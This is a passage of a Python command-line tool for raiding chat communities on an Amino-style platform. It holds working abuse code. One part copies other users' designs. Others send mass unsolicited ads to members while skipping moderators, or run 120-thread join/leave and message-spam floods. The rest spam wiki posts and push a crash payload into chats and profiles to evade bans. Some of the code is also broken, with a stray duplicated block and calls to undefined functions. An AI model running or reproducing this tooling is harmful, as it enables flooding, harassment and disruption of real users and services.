            total = f'Community Name: {name}\nCommunity icon: {icon}\nCommunity Description:\n\n{content}\n\nMedia list:\n {str(mediaList)}\n\n\n{info}'
            file_name = f"community_{name_generator()}.txt"
            file = open(file_name, "w+", encoding="utf-8")
            file.write(total)
            print(successful_color, f'Design saved to file "{file_name}"', regular_color)
        except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")


    def chat_design():
        try:
            link_info = client.get_from_link(input(f"{input_color}Link to chat #~ {regular_color}"))['extensions']['linkInfo']
            chat_info = client.get_chat_thread(comId=link_info['ndcId'], chatId=link_info['objectId'])
            name = chat_info['title']
            icon = chat_info['icon']
            try:chatContent = chat_info['content']
            except:chatContent = None
            try:chatBackground = chat_info['extensions']['bm'][1]
            except:chatBackground = None
            total = f'Name: {name}\nIcon: {icon}\nContent:\n\n{chatContent}\n\nChat background: {chatBackground}'
            file_name = f"chat_{name_generator()}.txt"
            file = open(file_name, "w+", encoding="utf-8")
            file.write(total)
            print(successful_color, f'Design saved to file "{file_name}"', regular_color)
        except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")




    def choiceDecor():
        if client.email =='Guest':print(f'{error_color}\nYou are not logged in.{regular_color}\n')
        else:
            select = input(f"""
{successful_color}================ DECOR STEALER ================

    {error_color}= stop - go to main menu =

1)Profile design
2)Community Design
3)Chat design
{input_color}Choose a steal method #~ {regular_color}""")
            if select == '1':profile_design();sl(1);choiceDecor()
            elif select == '2':community_design();sl(1);choiceDecor()
            elif select == '3':chat_design();sl(1);choiceDecor()
            elif select == 'stop':mainProcess()
            elif select == 'clear': clear();choiceDecor()
            else:print(f"\n{error_color}Invalid method, please select one of the suggested methods.{regular_color}\n");sl(1);choiceDecor()

    choiceDecor()




def antiBan():
    if client.email =='Guest':print(f'{error_color}\nYou are not logged in.{regular_color}\n')
    else:
        comId=getComId()
        select = input(f"""
    {error_color}= stop - go to main menu =

1)Enable antiban
2)Disable antiban
{input_color}Choose a steal method #~ {regular_color}""")
        if select == '1':client.change_profile(comId=comId, content=crash); print(successful_color,'\nAntiban enabled.\n',regular_color)
        elif select == '2':client.change_profile(comId=comId, content="S."); print(successful_color,'\nAntiban disabled.\n',regular_color)
        elif select == 'stop':mainProcess()
        elif select == 'clear': clear();antiBan()
        else:print(error_color,f'\nSelect an action.\n{regular_color}')




def privatePiar():
    def start_piar(userIds, comId, message):
        try:
            chatId = client.start_chat(userId=userIds, message=None, comId=comId, content=message)["threadId"]
            try:client.send_message_web(chatId=chatId, comId=comId, message=message);print(successful_color,'Ad sent successfully.\n',regular_color)
            except Exception as error:print(error_color, f"Failed to send message:\n{error}\n", regular_color)
        except Exception as error:print(error_color, f"Chat creation error:\n{error}\n", regular_color)

    if client.email =='Guest':print(f'{error_color}\nYou are not logged in.{regular_color}\n')
    else:
        if process == True:print(error_color, 'Starting is not possible. Some protocol is running in parallel. protocol stop - to stop', regular_color)
        else:
            comId=getComId()
            userIds = list()
            while True:
                user_type = input(f"{error_color}\t= stop - go to main menu =\n\n1)Online users\n2)All users\n{input_color}Select user type #~ {regular_color}")
                if user_type == '1':users = client.get_community_members(comId=comId, type="online", size=100)["userProfileList"]; break
                elif user_type == '2':users = client.get_community_members(comId=comId, type="recent", size=100)["userProfileList"]; break
                else:print(error_color, f"\nChoose one of the options\n", regular_color)
            admins = client.get_community_members(comId=comId, type="leaders", size=100)["userProfileList"]+client.get_community_members(comId=comId, type="curators", size=100)["userProfileList"]
            for i in users:
                userIds.append(i["uid"])
            for i in admins:
                i = i["uid"]
                if i in userIds:userIds.remove(i)
            while True:
                message = input(f"{input_color}Piar message #~ {regular_color}")
                if message != '':break
            for _ in range(6):
            	Thread(target=start_piar, args=(userIds, comId, message)).start()
            sl(5)


def JLRaid():
    global process
    def JLRstart(comId, chatId, num):
        log(f"[JLR - {num}] Thread started.")
        while process:
            try:
                client.join_chat_web(chatId=chatId, comId=comId)
                client.leave_chat_web(chatId=chatId, comId=comId)
            except Exception as error:log(f"[JLR - {num}] ERROR:\n{error}\n")
    if client.email =='Guest':print(f'{error_color}\nYou are not logged in.{regular_color}\n')
    else:
        if process == True:print(error_color, 'Starting is not possible. Some protocol is running in parallel. protocol stop - to stop', regular_color)
        else:
            url = input(f"\n{input_color}Link to chat #~ {regular_color}")
            try:chat_info = client.get_from_link(url)['extensions']['linkInfo']; chatId=chat_info['objectId']; comId=chat_info['ndcId'];print(successful_color,"Successful retrieval of chat information.",regular_color)
            except Exception as error:print(error_color, f'\nError:\n{error}\n', regular_color);JLRaid()
            try:client.join_community(comId=comId); print(successful_color,"Successful join community.",regular_color);log(f"[JLR] Successful join community.")
            except Exception as error:print(error_color, f'\nError join community:\n{error}\n', regular_color);log(f"[JLR] Error join community:\n{error}\n")
            try:
                log("[JLR] Running Threads...")
                print(successful_color,"Running Threads...",regular_color)
                process = True
                for i in range(120):Thread(target=JLRstart, args=(comId, chatId, i)).start();sl(0.3)
            except Exception as error:print(error_color, f'\nFailed to start raid.\n{error}\n', regular_color);log(f"[JLR] Failed to start raid.\n{error}\n")





def simpleReid(type: str = None):
    global process

    def spam(comId, chatId, message, messageType, num):
        log(f"[R - {num}] Thread started.")

        while process:
            try:client.send_message_web(chatId=chatId, comId=comId, message=message, messageType=messageType)
            except Exception as error:log(f"[R - {num}] Failed to send spam.\n{error}\n")




    def getMess():
        message = input(f"\n{input_color}Message #~ {regular_color}")
        if message == '':print(error_color, f'\nEnter your message\n', regular_color);getMess()
        else:return message

    def getMType():
        mType = input(f"""
1)Regular messages
2)System messages
3)Type 103
4)Type 1
5)Type 56
6)Type 57
7)Type 58
8)Type 59
9)Type 60
10)Type 114
11)Type 107
12)Type 108
13)Type 111
14)Type 112
\n{input_color}Message type #~ {regular_color}""")
        if mType == '1':return 0
        elif mType == '2':return 109
        elif mType == '3':return 103
        elif mType == '4':return 1
        elif mType == '5':return 56
        elif mType == '6':return 57
        elif mType == '7':return 58
        elif mType == '8':return 59
        elif mType == '9':return 60
        elif mType == '10':return 114
        elif mType == '11':return 107
        elif mType == '12':return 108
        elif mType == '13':return 111
        elif mType == '14':return 112
        else:print(error_color, f'\nSelect message type\n', regular_color);getMType()


    if client.email =='Guest':print(f'{error_color}\nYou are not logged in.{regular_color}\n')
    else:
        if process == True:print(error_color, 'Starting is not possible. Some protocol is running in parallel. protocol stop - to stop', regular_color)
        else:
            url = input(f"\n{input_color}Link to chat #~ {regular_color}")
            try:chat_info = client.get_from_link(url)['extensions']['linkInfo']; chatId=chat_info['objectId']; comId=chat_info['ndcId'];print(successful_color,"Successful retrieval of chat information.",regular_color)
            except Exception as error:print(error_color, f'\nError:\n{error}\n', regular_color);JLRaid()
            try:client.join_community(comId=comId); print(successful_color,"Successful join community.",regular_color);log(f"[R] Successful join community.")
            except Exception as error:print(error_color, f'\nError join community:\n{error}\n', regular_color);log(f"[R] Error join community:\n{error}\n")
            if type == 'crash':message=crash; mType=107
            else:
                message = getMess()
                mType = getMType()
            client.join_chat_web(chatId=chatId, comId=comId)
            try:
                log("[R] Running Threads...")
                print(successful_color,"Running Threads...",regular_color)
                process = True
                for i in range(120):Thread(target=spam, args=(comId, chatId, message, mType, i)).start();sl(0.3)
            except Exception as error:print(error_color, f'\nFailed to start raid.\n{error}\n', regular_color);log(f"[JLR] Failed to start raid.\n{error}\n")






def WikiSpam():
    global process
    def spam(comId, title, content, num):
        global process
        if process == True:log(f"[WS - {num}] Thread started.")
        while process:
            try:client.post_wiki(comId=comId, title=title, content=content)
            except Exception as error:log(f"[WS - {num}] Failed to create post. {error}");sl(30)


    def getText(text):
        txt = input(f"\n{input_color}{text} #~ {regular_color}")
        if txt == '':print(error_color, f'\nEnter text\n', regular_color);getMess()
        else:return txt


    if client.email =='Guest':print(f'{error_color}\nYou are not logged in.{regular_color}\n')
    else:
        if process == True:print(error_color, 'Starting is not possible. Some protocol is running in parallel. protocol stop - to stop', regular_color)
        else:
            comId = getComId()
            title = getText("Enter post title")
            content = getText("Enter content")
            log("[WS] Running Threads...")
            print(successful_color,"Running Threads...",regular_color)
            process = True
            for i in range(120):Thread(target=spam, args=(comId, title, content, i)).start();sl(0.3)



    if client.email =='Guest':print(f'{error_color}\nYou are not logged in.{regular_color}\n')
    else:
        if process == True:print(error_color, 'Starting is not possible. Some protocol is running in parallel. protocol stop - to stop', regular_color)
        else:
            url = input(f"\n{input_color}Link to chat #~ {regular_color}")
            try:chat_info = client.get_from_link(url)['extensions']['linkInfo']; chatId=chat_info['objectId']; comId=chat_info['ndcId']
            except Exception as error:print(error_color, f'\nError:\n{error}\n', regular_color);clearChat()
            while True:
                try:
                    num = int(input(f"{error_color}Minimum 1\nMaximum 200 (otherwise a 403 error may occur)\nNumber of messages to delete{input_color}\nNumber of messages to delete #~ {regular_color}"))
                    if num <1 or num > 200:print(error_color, '\nIncorrect value.\n', regular_color)
                    else:break
                except ValueError:print(f"{error_color}\nPlease enter a number{regular_color}\n")
            Thread(target=clean, args=(comId, chatId, num)).start()






def onlineUsers():
    if client.email =='Guest':print(f'{error_color}\nYou are not logged in.{regular_color}\n')
    else:
        comId = getComId()
        l = client.get_community_members(comId=comId, type="leaders", size=100)["userProfileList"]
        c =client.get_community_members(comId=comId, type="curators", size=100)["userProfileList"]
        users = client.get_community_members(comId=comId, size=100, type='online')["userProfileList"]
        start = 100
        for i in range(10):
            new = client.get_community_members(comId=comId, size=100, start=start, type='online')["userProfileList"]
            for x in range(len(new)):
                if new[x] not in users:users.append(new[x])
            start+=100
        leaders=list();curators=list()
        for x in range(len(l)):leaders.append(l[x]['uid'])
        for x in range(len(c)):curators.append(c[x]['uid'])
        for i in range(len(users)):
            nick = users[i]['nickname']
            userId = users[i]['uid']
            level = users[i]['level']
            if userId in leaders:status='leader'
            elif userId in curators:status='curator'
            else:status='user'
            print(f"{successful_color}{status}{regular_color} | {input_color}{nick}{regular_color} | {level} | {error_color}{userId}{regular_color}")
        print(f"{successful_color}Total Online: {len(users)}{regular_color}")




def protocol(command):
    scom=command.split(" ")
    try:
        if scom[1] == '1':privatePiar()
        elif scom[1] == '2':JLRaid()
        elif scom[1] == '3':simpleReid()
        elif scom[1] == '4':WikiSpam()
        elif scom[1] == '5':simpleReid(type='crash')
        else:help("protocol")
    except IndexError:help("protocol")

def mainProcess():
    global process
    while True:
        command = input(f"\n{input_color}[{error_color}{client.email}{input_color}] #~ {regular_color}").lower()
        scom = command.split(" ")
        try:
            if command == 'clear':clear()
            elif command == 'exit':process=False;exit()
            elif scom[0] == 'help':help(command)
            elif command == 'ban':ban_tools()
            elif command == 'decor': decor_tools()
            elif command == 'protocol stop':
                if process == True: process=False
                else:print(error_color, 'No running protocols', regular_color)
            elif command == 'log':
                if 'LOG.txt' in os.listdir():file = open('LOG.txt', 'r');print(file.read());file.close()
                else:print(f'{error_color}\nLogs are empty.{regular_color}\n')
            elif command == 'log del':
                if 'LOG.txt' in os.listdir():os.remove("LOG.txt");print(f'{successful_color}\nLOG removed.{regular_color}\n')
                else:print(f'{error_color}\nLogs are empty.{regular_color}\n')
            elif command == 'logout':
                if client.email =='Guest':print(f'{error_color}\nYou are not logged in.{regular_color}\n')
                else:process=False;client.logout()

            elif scom[0] == 'login':
                if client.email != 'Guest':print(f'{error_color}\nYou are already logged in.{regular_color}\n')
                else:
                    try:client.login(email=command.split(" ")[1], password=command.split(" ")[2]);client.email = command.split(" ")[1]
                    except IndexError:auth_type()
                    except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")
            elif command == 'cl-sessions':
                if 'Sessions.txt' in os.listdir():os.remove("Sessions.txt");print(f'{successful_color}\nSessions removed.{regular_color}\n')
                else:print(f'{error_color}\nYou have no recent sessions.{regular_color}\n')
            elif command == 'session':
                if client.email == 'Guest':print(f"\n{error_color}You are not logged in.{regular_color}\n")
                else:
                    info=client.get_account_info()
                    uid=info['uid']
                    SID = info['sid']
                    name=info['other']['nickname']
                    email = info['other']['email']
                    googleID = info['other']['googleID']
                    appleID = info['other']['appleID']
                    print(f'\n{successful_color}=============session info============={input_color}\nname:{regular_color} {name}\n{input_color}email:{regular_color} {email}\n{input_color}uid:{regular_color} {uid}\n{input_color}googleID:{regular_color} {googleID}\n{input_color}appleID:{regular_color} {appleID}\n\n{error_color}{SID}{regular_color}\n\n')
            elif command == 'antiban':antiBan()
            elif command == 'join com':
                if client.email =='Guest':print(f'{error_color}\nYou are not logged in.{regular_color}\n')
                else:client.join_community(client.get_from_link(input(f"{input_color}Сommunity link #~ {regular_color}"))['extensions']['community']['ndcId']);print(successful_color,'\nSuccessfully.\n',regular_color)
            elif command == 'leave com':
                if client.email =='Guest':print(f'{error_color}\nYou are not logged in.{regular_color}\n')
                else:client.leave_community(getComId());print(successful_color,'\nSuccessfully.\n',regular_color)
            elif scom[0] == 'protocol':protocol(command)
            elif command == 'proxy':print(f'\n{str(client.proxies)}\n')
            elif command == 'proxy set':client.proxies = {'http': input(f"{input_color}HTTP proxy #~ {regular_color}"),'https': input(f"{input_color}HTTPS proxy #~ {regular_color}"),}
            elif command == 'proxy del':client.proxies = None
            elif command == 'online':onlineUsers()
            else:print(f'{error_color}\nCommand not found. Use "help"{regular_color}\n')
        except Exception as error:print(f"\n{input_color}[{error_color}{client.email}{input_color}]{error_color}Error:\n{error}{regular_color}\n")

if __name__ == '__main__':
    mainProcess()
